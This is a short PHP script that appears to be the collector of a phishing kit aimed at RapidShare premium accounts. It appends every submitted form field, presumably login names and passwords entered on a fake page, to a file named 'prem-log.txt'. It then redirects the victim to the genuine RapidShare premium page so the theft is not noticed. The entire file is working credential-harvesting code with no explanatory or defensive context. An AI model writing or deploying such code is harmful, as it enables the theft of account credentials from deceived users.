<?php
header ('Location: https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi ');
$handle = fopen("prem-log.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>